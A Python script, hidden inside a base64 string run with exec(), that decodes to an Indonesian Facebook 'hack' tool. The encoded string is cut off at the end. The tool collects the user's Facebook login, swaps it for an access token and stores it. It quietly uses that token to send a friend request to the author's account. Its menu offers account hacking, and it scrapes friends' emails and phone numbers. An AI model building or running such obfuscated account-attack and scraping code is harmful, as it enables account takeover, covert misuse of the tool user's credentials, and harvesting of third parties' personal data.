#Encode by Anbia Nuansyah
#Apa Kau mau recode ?
import base64
exec(base64.b64decode('IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KCmltcG9ydCBvcywgc3lzLCB0aW1lLCBkYXRldGltZSwgcmFuZG9tLCBoYXNobGliLCByZSwgdGhyZWFkaW5nLCBqc29uLCBnZXRwYXNzLCB1cmxsaWIsIHJlcXVlc3RzLCBtZWNoYW5pemUKZnJvbSBtdWx0aXByb2Nlc3NpbmcucG9vbCBpbXBvcnQgVGhyZWFkUG9vbAp0cnk6CiAgICBpbXBvcnQgbWVjaGFuaXplCmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIG9zLnN5c3RlbSgncGlwMiBpbnN0YWxsIG1lY2hhbml6ZScpCmVsc2U6CiAgICB0cnk6CiAgICAgICAgaW1wb3J0IHJlcXVlc3RzCiAgICBleGNlcHQgSW1wb3J0RXJyb3I6CiAgICAgICAgb3Muc3lzdGVtKCdwaXAyIGluc3RhbGwgcmVxdWVzdHMnKQoKZnJvbSByZXF1ZXN0cy5leGNlcHRpb25zIGltcG9ydCBDb25uZWN0aW9uRXJyb3IKZnJvbSBtZWNoYW5pemUgaW1wb3J0IEJyb3dzZXIKcmVsb2FkKHN5cykKc3lzLnNldGRlZmF1bHRlbmNvZGluZygndXRmOCcpCmJyID0gbWVjaGFuaXplLkJyb3dzZXIoKQpici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkKYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLCBtYXhfdGltZT0xKQpici5hZGRoZWFkZXJzID0gWygnVXNlci1BZ2VudCcsICdPcGVyYS85LjgwIChBbmRyb2lkOyBPcGVyYSBNaW5pLzM2LjIuMjI1NC8xMTkuMTMyOyBVOyBpZCkgUHJlc3RvLzIuMTIuNDIzIFZlcnNpb24vMTIuMTYnKV0KCgpkZWYga2VsdWFyKCk6CiAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUdXR1cCcKICAgIG9zLnN5cy5leGl0KCkKCgpkZWYgamFsYW4oeik6CiAgICBmb3IgZSBpbiB6ICsgJ1xuJzoKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgdGltZS5zbGVlcCgwLjAxKQoKbG9nbyA9ICIgXHgxYlsxOzkybeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiFxuIFx4MWJbMTs5Mm3ilojiloTilojilojilojilojilojiloTiloggICAgICAgICBceDFiWzE7OTdt4peP4pas4pas4pas4pas4pas4pas4pas4pas4pas4LmR26nbqeC5keKWrOKWrOKWrOKWrOKWrOKWrOKWrOKWrOKXj1xuIFx4MWJbMTs5Mm3iloggXHgxYlsxOzkzbeKWvOKWvOKWvOKWvOKWvCAgXHgxYlsxOzk3bS0gXyAtLV8tLSBceDFiWzE7OTJt4pWU4pWm4pWX4pSM4pSA4pSQ4pSs4pSA4pSQ4pSs4pSM4pSAICAg4pWU4pWQ4pWX4pWU4pWXIFxuIFx4MWJbMTs5Mm3iloggIFx4MWJbMTs5N20gIFx4MWJbMTs5N21fLV8tLSAtXyAtLV9fIFx4MWJbMTs5Mm0g4pWR4pWR4pSc4pSA4pSk4pSc4pSs4pSY4pSc4pS04pSQ4pSA4pSA4pSA4pWg4pWjIOKVoOKVqeKVl1xuIFx4MWJbMTs5Mm3iloggXHgxYlsxOzkzbeKWsuKWsuKWsuKWsuKWsiBceDFiWzE7OTdtLS0gIC0gXyAtLSBceDFiWzE7OTJt4pWQ4pWp4pWd4pS0IOKUtOKUtOKUlOKUgOKUtCDilLQgICDilZogIOKVmuKVkOKVnSAgXHgxYlsxOzkzbVBhdGNoXG4gXHgxYlsxOzkybeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiCAgICAgICAgIFx4MWJbMTs5N23Cqz09PT09PT09PT3inKc9PT09PT09PT09wrtcbiBceDFiWzE7OTJtIOKWiOKWiCDilojilohcbiBceDFiWzE7OTdt4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXXG4gXHgxYlsxOzk3beKVkSBceDFiWzE7OTNtKiAgXHgxYlsxOzk3bUF1dGhvciAgIFx4MWJbMTs5MW06ICBceDFiWzE7OTZtIFNBTlNCQUUgICAgIFx4MWJbMTs5N20gICAgICAgICAgICAgICAgICAg4pWRXG4gXHgxYlsxOzk3beKVkSBceDFiWzE7OTNtKiAgXHgxYlsxOzk3bUdpdEh1YiAgIFx4MWJbMTs5MW06ICBceDFiWzE7OTJtIFx4MWJbOTJtaHR0cHM6Ly9naXRodWIuY29tL1NhbnNCYWUgIFx4MWJbICAgIFx4MWJbMTs5N20g4pWRXG4gXHgxYlsxOzk3beKVkSBceDFiWzE7OTNtKiAgXHgxYlsxOzk3bUZCICAgICAgIFx4MWJbMTs5MW06ICAgXHgxYlsxOzkyXHgxYls5Mm1odHRwczovL2ZiLm1lL2FuYmlhLnNhbnMgXHgxYlsgICAgIFx4MWJbMTs5N20gICDilZEgICBcbiBceDFiWzE7OTdt4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdIiAgJ1xuXHgxYlsxOzkybVsqXSBTaWxhaGthbiBCdWF0IEFrdW4gQmFydSBBZ2FyIFRlcmhpbmRhciBEYXJpIENoZWNrcG9pbnRcbicKCmRlZiB0aWsoKToKICAgIHRpdGlrID0gWwogICAgICcuICAgJywgJy4uICAnLCAnLi4uICddCiAgICBmb3IgbyBpbiB0aXRpazoKICAgICAgICBwcmludCAnXHJceDFiWzE7OTFtW1x4ZTJceDk3XHg4Zl0gXHgxYlsxOzkybUxvYWRpbmcgXHgxYlsxOzk3bScgKyBvLAogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKCgpiYWNrID0gMAp0aHJlYWRzID0gW10KYmVyaGFzaWwgPSBbXQpjZWtwb2ludCA9IFtdCmdhZ2FsID0gW10KaWRmcmllbmRzID0gW10KaWRmcm9tZnJpZW5kcyA9IFtdCmlkbWVtID0gW10KaWQgPSBbXQplbSA9IFtdCmVtZnJvbWZyaWVuZHMgPSBbXQpocCA9IFtdCmhwZnJvbWZyaWVuZHMgPSBbXQpyZWFrc2kgPSBbXQpyZWFrc2lncnVwID0gW10Ka29tZW4gPSBbXQprb21lbmdydXAgPSBbXQpsaXN0Z3J1cCA9IFtdCnZ1bG5vdCA9ICdceDFiWzMxbU5vdCBWdWxuJwp2dWxuID0gJ1x4MWJbMzJtVnVsbicKCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludCAiXHgxYlswOzMxbSDimpTilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDimKDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDimpQiCnByaW50ICAiIiJceDFiWzA7MzFtIFvCpF0gXHgxYlswOzMxbUFTQUxBTVVBTEFJS1VNXHgxYlswOzMxbSAgXDAzM1sxOzk2bSAgIFvCpF0gXHgxYlswOzMxbVdIQVRTQVBQIDogMDg5NTI0ODU0ODU0XHgxYlsxOzk2bSAgClwwMzNbMTs5M20gW8KkXSBceDFiWzA7MzFtI0RJUlVNQUhBSkFceDFiWzE7OTZtICAgICAgICBbwqRdIFx4MWJbMDszMW1GQUNFQk9PSyA6IFRSVVNUIE1FXHgxYlsxOzk2bSAgClwwMzNbMTs5M20gW8KkXSBceDFiWzA7MzFtVE9PTFMgQ1JFQVRPUlx4MWJbMTs5Nm0gICAgICBbwqRdIFx4MWJbMDszMW1ZT1VUVUJFICA6IFNBTlNCQUVceDFiWzA7MzFtIiIiCnByaW50ICIgXHgxYlsxOzkzbeKalOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKYoOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKalCIKCkNvcnJlY3RVc2VybmFtZSA9ICJBTkJJQTAxIgpDb3JyZWN0UGFzc3dvcmQgPSAiQU1BTkRBMDEiCgpsb29wID0gJ3RydWUnCndoaWxlIChsb29wID09ICd0cnVlJyk6CiAgICB1c2VybmFtZSA9IHJhd19pbnB1dCgiXDAzM1sxOzk2bVvimIZdIFx4MWJbMDszMW1VU0VSTkFNRSBUT09MUyBJTkkgXHgxYlsxOzk2bT4+Pj4gIikKICAgIGlmICh1c2VybmFtZSA9PSBDb3JyZWN0VXNlcm5hbWUpOgogICAgCXBhc3N3b3JkID0gcmF3X2lucHV0KCJcMDMzWzE7OTZtW+KYhl0gXHgxYlswOzMxbVBBU1NXT1JEIFRPT0xTIElOSSBceDFiWzE7OTZtPj4+PiAiKQogICAgICAgIGlmIChwYXNzd29yZCA9PSBDb3JyZWN0UGFzc3dvcmQpOgogICAgICAgICAgICBwcmludCAiTG9naW4gQmVyaGFzaWwgOicpIiArIHVzZXJuYW1lCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9TQU5TQkFFJykKICAgICAgICAgICAgbG9vcCA9ICdmYWxzZScKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCAiU0FMQUggTElTRU5TSU5ZQSBHQU4iCiAgICAgICAgICAgIG9zLnN5c3RlbSgneGRnLW9wZW4gaHR0cHM6Ly93d3cueW91dHViZS5jb20vYy9TQU5TQkFFJykKCQkJCgpkZWYgbG9naW4oKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKQogICAgICAgIG1lbnUoKQogICAgZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgcHJpbnQgbG9nbwogICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OThceDg2XSBceDFiWzE7OTJtTUFTVUsgQUtVTiBGQUNFQk9PSyBceDFiWzE7OTFtW1x4ZTJceDk4XHg4Nl0nCiAgICAgICAgaWQgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzM2bVVzZXJuYW1lIFx4MWJbMTs5MW06XHgxYlsxOzkybSAnKQogICAgICAgIHB3ZCA9IGdldHBhc3MuZ2V0cGFzcygnXHgxYlsxOzkxbVsrXSBceDFiWzE7MzZtUGFzc3dvcmQgXHgxYlsxOzkxbTpceDFiWzE7OTJtICcpCiAgICAgICAgdGlrKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGJyLm9wZW4oJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20nKQogICAgICAgIGV4Y2VwdCBtZWNoYW5pemUuVVJMRXJyb3I6CiAgICAgICAgICAgIHByaW50ICdcblx4MWJbMTs5MW1bIV0gVGlkYWsgQWRhIEtvbmVrc2knCiAgICAgICAgICAgIGtlbHVhcigpCgogICAgICAgIGJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCiAgICAgICAgYnIuc2VsZWN0X2Zvcm0obnI9MCkKICAgICAgICBici5mb3JtWydlbWFpbCddID0gaWQKICAgICAgICBici5mb3JtWydwYXNzJ10gPSBwd2QKICAgICAgICBici5zdWJtaXQoKQogICAgICAgIHVybCA9IGJyLmdldHVybCgpCiAgICAgICAgaWYgJ3NhdmUtZGV2aWNlJyBpbiB1cmw6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNpZyA9ICdhcGlfa2V5PTg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkY3JlZGVudGlhbHNfdHlwZT1wYXNzd29yZGVtYWlsPScgKyBpZCArICdmb3JtYXQ9SlNPTmdlbmVyYXRlX21hY2hpbmVfaWQ9MWdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xbG9jYWxlPWVuX1VTbWV0aG9kPWF1dGgubG9naW5wYXNzd29yZD0nICsgcHdkICsgJ3JldHVybl9zc2xfcmVzb3VyY2VzPTB2PTEuMDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJwogICAgICAgICAgICAgICAgZGF0YSA9IHsnYXBpX2tleSc6ICc4ODJhODQ5MDM2MWRhOTg3MDJiZjk3YTAyMWRkYzE0ZCcsICdjcmVkZW50aWFsc190eXBlJzogJ3Bhc3N3b3JkJywgJ2VtYWlsJzogaWQsICdmb3JtYXQnOiAnSlNPTicsICdnZW5lcmF0ZV9tYWNoaW5lX2lkJzogJzEnLCAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzogJzEnLCAnbG9jYWxlJzogJ2VuX1VTJywgJ21ldGhvZCc6ICdhdXRoLmxvZ2luJywgJ3Bhc3N3b3JkJzogcHdkLCAncmV0dXJuX3NzbF9yZXNvdXJjZXMnOiAnMCcsICd2JzogJzEuMCd9CiAgICAgICAgICAgICAgICB4ID0gaGFzaGxpYi5uZXcoJ21kNScpCiAgICAgICAgICAgICAgICB4LnVwZGF0ZShzaWcpCiAgICAgICAgICAgICAgICBhID0geC5oZXhkaWdlc3QoKQogICAgICAgICAgICAgICAgZGF0YS51cGRhdGUoeydzaWcnOiBhfSkKICAgICAgICAgICAgICAgIHVybCA9ICdodHRwczovL2FwaS5mYWNlYm9vay5jb20vcmVzdHNlcnZlci5waHAnCiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHVybCwgcGFyYW1zPWRhdGEpCiAgICAgICAgICAgICAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgICAgICB6ZWRkID0gb3BlbignbG9naW4udHh0JywgJ3cnKQogICAgICAgICAgICAgICAgemVkZC53cml0ZSh6WydhY2Nlc3NfdG9rZW4nXSkKICAgICAgICAgICAgICAgIHplZGQuY2xvc2UoKQogICAgICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceDkzXHgxYlsxOzkxbV0gXHgxYlsxOzkybUxvZ2luIHN1Y2Nlc3MnCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP21ldGhvZD1wb3N0JnVpZHM9Z3dpbXVzYTMmYWNjZXNzX3Rva2VuPScgKyB6WydhY2Nlc3NfdG9rZW4nXSkKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgICAgIG1lbnUoKQogICAgICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgICAgICAgICBwcmludCAnXG5ceDFiWzE7OTFtWyFdIFRpZGFrIEFkYSBLb25la3NpJwogICAgICAgICAgICAgICAga2VsdWFyKCkKCiAgICAgICAgaWYgJ2NoZWNrcG9pbnQnIGluIHVybDoKICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVshXSBceDFiWzE7OTNtQWNjb3VudCBIYXMgQmVlbiBDaGVja3BvaW50JwogICAgICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMDEpCiAgICAgICAgICAgIGtlbHVhcigpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVshXSBHYWdhbCBNYXN1aycKICAgICAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICAgICAgdGltZS5zbGVlcCgwLjAxKQogICAgICAgICAgICBsb2dpbigpCgoKZGVmIG1lbnUoKToKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDAuMDEpCiAgICAgICAgbG9naW4oKQogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG90dyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgYSA9IGpzb24ubG9hZHMob3R3LnRleHQpCiAgICAgICAgICAgIG5hbWEgPSBhWyduYW1lJ10KICAgICAgICAgICAgaWQgPSBhWydpZCddCiAgICAgICAgICAgIG90cyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgICAgICAgICAgYiA9IGpzb24ubG9hZHMob3RzLnRleHQpCiAgICAgICAgICAgIHN1YiA9IHN0cihiWydzdW1tYXJ5J11bJ3RvdGFsX2NvdW50J10pCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gXHgxYlsxOzkzbVNlcGVydGlueWEgYWt1biBrZW5hIENoZWNrcG9pbnQnCiAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKICAgICAgICAgICAgbG9naW4oKQogICAgICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKICAgICAgICAgICAgcHJpbnQgbG9nbwogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUaWRhayBBZGEgS29uZWtzaScKICAgICAgICAgICAga2VsdWFyKCkKCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHByaW50IGxvZ28KICAgIHByaW50ICdceDFiWzE7OTdtXHhlMlx4OTVceDk0JyArIDUwICogJ1x4ZTJceDk1XHg5MCcgKyAn4pWXJwogICAgcHJpbnQgJ1x4ZTJceDk1XHg5MVx4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dXHgxYlsxOzk3bSBOYW1lIFx4MWJbMTs5MW06IFx4MWJbMTs5Mm0nICsgbmFtYSArICgzOSAtIGxlbihuYW1hKSkgKiAnXHgxYlsxOzk3bSAnICsgJ+KVkScKICAgIHByaW50ICdceGUyXHg5NVx4OTFceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4OTNceDFiWzE7OTFtXVx4MWJbMTs5N20gRkJJRCBceDFiWzE7OTFtOiBceDFiWzE7OTJtJyArIGlkICsgKDM5IC0gbGVuKGlkKSkgKiAnXHgxYlsxOzk3bSAnICsgJ+KVkScKICAgIHByaW50ICdceGUyXHg5NVx4OTFceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4OTNceDFiWzE7OTFtXVx4MWJbMTs5N20gU3VicyBceDFiWzE7OTFtOiBceDFiWzE7OTJtJyArIHN1YiArICgzOSAtIGxlbihzdWIpKSAqICdceDFiWzE7OTdtICcgKyAn4pWRJwogICAgcHJpbnQgJ1x4MWJbMTs5N23ilaAnICsgNTAgKiAnXHhlMlx4OTVceDkwJyArICfilZ0nCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTEuIFVzZXIgSW5mb3JtYXRpb24nCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTIuIEhhY2sgRmFjZWJvb2sgQWNjb3VudCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMy4gQm90JwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG00LiBPdGhlcnMnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTUuIFVwZGF0ZScKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNi4gTG9nb3V0JwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszMTs0MG0wLiBFeGl0JwogICAgcHJpbnQgJ1x4MWJbMTszNzs0MG3ilZEnCiAgICBwaWxpaCgpCgoKZGVmIHBpbGloKCk6CiAgICB6ZWRkID0gcmF3X2lucHV0KCfilZrilZBceDFiWzE7OTFt4pa2XHgxYlsxOzk3bSAnKQogICAgaWYgemVkZCA9PSAnJzoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBDYW5cJ3QgZW1wdHknCiAgICAgICAgcGlsaWgoKQogICAgZWxzZToKICAgICAgICBpZiB6ZWRkID09ICcxJzoKICAgICAgICAgICAgaW5mb3JtYXNpKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiB6ZWRkID09ICcyJzoKICAgICAgICAgICAgICAgIG1lbnVfaGFjaygpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiB6ZWRkID09ICczJzoKICAgICAgICAgICAgICAgICAgICBtZW51X2JvdCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGlmIHplZGQgPT0gJzQnOgogICAgICAgICAgICAgICAgICAgICAgICBsYWluKCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBpZiB6ZWRkID09ICc1JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgbG9nbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgnZ2l0IHB1bGwgb3JpZ2luIG1hc3RlcicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkxbVsgXHgxYlsxOzk3bUJhY2sgXHgxYlsxOzkxbV0nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVudSgpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB6ZWRkID09ICc2JzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCQkJb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy55b3V0dWJlLmNvbS9jL1NBTlNCQUUnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtlbHVhcigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHplZGQgPT0gJzAnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZWx1YXIoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDljXHg5Nl0gXHgxYlsxOzk3bScgKyB6ZWRkICsgJyBceDFiWzE7OTFtTm90IGF2YWlsYWJlbCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGlsaWgoKQoKCmRlZiBpbmZvcm1hc2koKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMC4wMSkKICAgICAgICBsb2dpbigpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgaWQgPSByYXdfaW5wdXQoJ1x4MWJbMTs5MW1bK10gXHgxYlsxOzkybUlucHV0IElEXHgxYlsxOzk3bS9ceDFiWzE7OTJtTmFtZVx4MWJbMTs5MW0gOiBceDFiWzE7OTdtJykKICAgIGphbGFuKCdceDFiWzE7OTFtW1x4ZTJceDljXHhiYV0gXHgxYlsxOzkybU1vaG9uIFR1bmdndSBceDFiWzE7OTdtLi4uJykKICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgIGNvayA9IGpzb24ubG9hZHMoci50ZXh0KQogICAgZm9yIHAgaW4gY29rWydkYXRhJ106CiAgICAgICAgaWYgaWQgaW4gcFsnbmFtZSddIG9yIGlkIGluIHBbJ2lkJ106CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycgKyBwWydpZCddICsgJz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgICAgICB6ID0ganNvbi5sb2FkcyhyLnRleHQpCiAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybU5hbWFceDFiWzE7OTdtICAgICAgICAgIDogJyArIHpbJ25hbWUnXQogICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVs/XSBceDFiWzE7OTJtTmFtYVx4MWJbMTs5N20gICAgICAgICAgOiBceDFiWzE7OTFtVGlkYWsgQWRhJwogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybUlEXHgxYlsxOzk3bSAgICAgICAgICAgIDogJyArIHpbJ2lkJ10KICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoKICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVs/XSBceDFiWzE7OTJtSURceDFiWzE7OTdtICAgICAgICAgICAgOiBceDFiWzE7OTFtVGlkYWsgQWRhJwogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybUVtYWlsXHgxYlsxOzk3bSAgICAgICAgIDogJyArIHpbJ2VtYWlsJ10KICAgICAgICAgICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtWz9dIFx4MWJbMTs5Mm1FbWFpbFx4MWJbMTs5N20gICAgICAgICA6IFx4MWJbMTs5MW1UaWRhayBBZGEnCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtTm9tb3IgVGVscG9uXHgxYlsxOzk3bSAgOiAnICsgelsnbW9iaWxlX3Bob25lJ10KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bP10gXHgxYlsxOzkybU5vbW9yIFRlbHBvblx4MWJbMTs5N20gIDogXHgxYlsxOzkxbU5vdCB